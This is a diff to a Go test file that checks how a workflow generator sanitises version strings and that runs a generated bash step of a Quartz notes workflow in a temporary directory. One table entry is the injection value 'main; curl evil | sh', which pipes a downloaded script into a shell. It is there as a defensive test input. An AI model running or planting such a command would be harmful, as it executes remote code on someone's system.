@@ -30,7 +30,8 @@ func TestWorkflowVersion(t *testing.T) {
 		"(devel)":              VersionPlaceholder,
 		"main; curl evil | sh": VersionPlaceholder,
 		"v1\nuses: x":          VersionPlaceholder,
-		"-flag":                VersionPlaceholder,
+		"v0.0.0-20261021120000-0123456789ab+dirty": VersionPlaceholder,
+		"-flag": VersionPlaceholder,
 	} {
 		if got := WorkflowVersion(in); got != want {
 			t.Errorf("WorkflowVersion(%q) = %q, want %q", in, got, want)
@@ -57,22 +58,63 @@ func TestWorkflowPinsTheVersionOrFailsLoudly(t *testing.T) {
 
 const pinnedConfig = "../../testdata/quartz/quartz.config.ts"
 
-// runPatch runs the workflow's patch script against the given quartz.config.ts
-// text and settings.json text and returns the patched config and the outcome.
+// stepScript returns the run script of the named step as the runner sees it:
+// the lines of the block scalar with the block indentation removed (YAML).
+func stepScript(t *testing.T, workflow, step string) string {
+	t.Helper()
+	lines := strings.Split(workflow, "\n")
+	for i, l := range lines {
+		if strings.TrimSpace(l) != "- name: "+step {
+			continue
+		}
+		for j := i + 1; j < len(lines); j++ {
+			if strings.TrimSpace(lines[j]) != "run: |" {
+				continue
+			}
+			var body []string
+			indent := -1
+			for _, b := range lines[j+1:] {
+				if strings.TrimSpace(b) == "" {
+					body = append(body, "")
+					continue
+				}
+				n := len(b) - len(strings.TrimLeft(b, " "))
+				if indent < 0 {
+					indent = n
+				}
+				if n < indent {
+					break
+				}
+				body = append(body, b[indent:])
+			}
+			return strings.Join(body, "\n") + "\n"
+		}
+	}
+	t.Fatalf("no step %q", step)
+	return ""
+}
+
+// runPatch runs the GENERATED "Copy the notes and apply the settings" step with
+// bash in a temp collection whose quartz checkout holds the given config text.
 func runPatch(t *testing.T, config, settings string) (string, error, string) {
 	t.Helper()
-	py, err := exec.LookPath("python3")
-	if err != nil {
-		t.Skip("python3 not available")
+	for _, tool := range []string{"python3", "bash"} {
+		if _, err := exec.LookPath(tool); err != nil {
+			t.Skip(tool + " not available")
+		}
 	}
 	dir := t.TempDir()
-	for p, text := range map[string]string{"quartz/quartz.config.ts": config, ".quartz/settings.json": settings} {
+	for p, text := range map[string]string{
+		"quartz/quartz.config.ts": config, ".quartz/settings.json": settings,
+		".quartz/index.md": "---\ntitle: x\n---\n", "notes/A.md": "a",
+	} {
 		_ = os.MkdirAll(filepath.Join(dir, filepath.Dir(p)), 0o755)
 		if err := os.WriteFile(filepath.Join(dir, p), []byte(text), 0o644); err != nil {
 			t.Fatal(err)
 		}
 	}
-	cmd := exec.Command(py, "-I", "-c", quartzPatch)
+	script := stepScript(t, workflow(t, "v1.2.3"), "Copy the notes and apply the settings")
+	cmd := exec.Command("bash", "-c", script)
 	cmd.Dir = dir
 	out, err := cmd.CombinedOutput()
 	b, _ := os.ReadFile(filepath.Join(dir, "quartz", "quartz.config.ts"))
